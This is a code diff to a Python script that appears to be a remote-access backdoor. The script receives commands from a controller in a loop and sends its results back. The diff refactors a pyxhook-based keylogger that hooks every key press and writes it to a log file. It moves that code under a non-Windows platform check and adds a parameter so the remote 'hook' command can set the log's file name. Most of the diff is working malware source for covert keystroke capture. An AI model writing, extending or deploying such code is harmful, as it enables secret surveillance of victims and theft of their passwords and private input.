@@ -1,9 +1,66 @@
 import socket, ssl, pprint, socks, os, sys, hashlib, hmac, platform, simplejson, thread
-import inspect, urllib2, os.path, base64, getpass, urllib, netifaces, time, pyxhook
+import inspect, urllib2, os.path, base64, getpass, urllib, netifaces, time
 from colored import fg, bg, attr
 from subprocess import Popen, PIPE, STDOUT
 from wifi import Cell, Scheme
 from Crypto.Cipher import AES
+
+if platform.system() == "Windows":
+    hookwin = "Can't import pyxhook"
+else:
+    import pyxhook
+    def kbevent(event):
+        Wevent = str(event) + "\n"
+        log.write(Wevent)
+
+    global HKthread
+    global hookman
+    global log
+    hookman = pyxhook.HookManager()
+    HKthread = thread
+    HKstat = "OFF"
+
+    def LinuxHOOKER(threadName, running):
+        hookman.KeyDown = kbevent
+        hookman.HookKeyboard()
+        hookman.start()
+        while 1:
+            time.sleep(0.1)
+
+    def LinuxHOOK(status, namefile):
+        global HKstat
+        if status == "check":
+            return HKstat
+        elif status == "ON":
+            if status == HKstat:
+                report = "Already running"
+                return report
+            else:
+                try:
+                    HKthread.start_new_thread(LinuxHOOKER, ("HK-1",1))
+                    log = open(namefile, 'wa')
+                    HKstat = "ON"
+                    return HKstat
+                except:
+                    HKstat = "Error: unable to start thread"
+                    return HKstat
+        elif status == "OFF":
+            if status == HKstat:
+                report = "Already stopped"
+                return report
+            else:
+                try:
+                    hookman.cancel() #and so HKthread.exit()
+                    time.sleep(0.1)
+                    log.close()
+                    HKstat = "OFF"
+                    return HKstat
+                except:
+                    statReturn = "Something went wrong, HKstat= " + HKstat
+                    return statReturn
+        else:
+            statReturn = "Something went wrong, HKstat= " + HKstat
+            return statReturn
 
 class PKCS7Encoder():
     class InvalidBlockSizeError(Exception):
@@ -62,60 +119,6 @@ else:
 
 # sysinfo
 uname = platform.uname()[0:3]
-
-#HOOK
-def kbevent(event):
-    Wevent = str(event) + "\n"
-    log.write(Wevent)
-
-global HKthread
-global hookman
-global log
-hookman = pyxhook.HookManager()
-HKthread = thread
-HKstat = "OFF"
-
-def HOOKER(threadName, running):
-    hookman.KeyDown = kbevent
-    hookman.HookKeyboard()
-    hookman.start()
-    while 1:
-        time.sleep(0.1)
-
-def LinuxHOOK(status):
-    global HKstat
-    if status == "check":
-        return HKstat
-    elif status == "ON":
-        if status == HKstat:
-            report = "Already running"
-            return report
-        else:
-            try:
-                HKthread.start_new_thread(HOOKER, ("HK-1",1))
-                log = open('logfileHK.txt', 'wa')
-                HKstat = "ON"
-                return HKstat
-            except:
-                HKstat = "Error: unable to start thread"
-                return HKstat
-    elif status == "OFF":
-        if status == HKstat:
-            report = "Already stopped"
-            return report
-        else:
-            try:
-                hookman.cancel() #and so HKthread.exit()
-                time.sleep(0.1)
-                log.close()
-                HKstat = "OFF"
-                return HKstat
-            except:
-                statReturn = "Something went wrong, HKstat= " + HKstat
-                return statReturn
-    else:
-        statReturn = "Something went wrong, HKstat= " + HKstat
-        return statReturn
 
 # getting target IP
 try:
@@ -364,7 +367,7 @@ while 1:
         sys.exit(0)
     elif inText.startswith("hook"):
         if platform.system() == "Linux":
-            hookstat = LinuxHOOK(inText.split(':')[1])
+            hookstat = LinuxHOOK(inText.split(':')[1],inText.split(":")[2])
             SendData(hookstat)
         else:
             SendData("Error: platform not supported!")
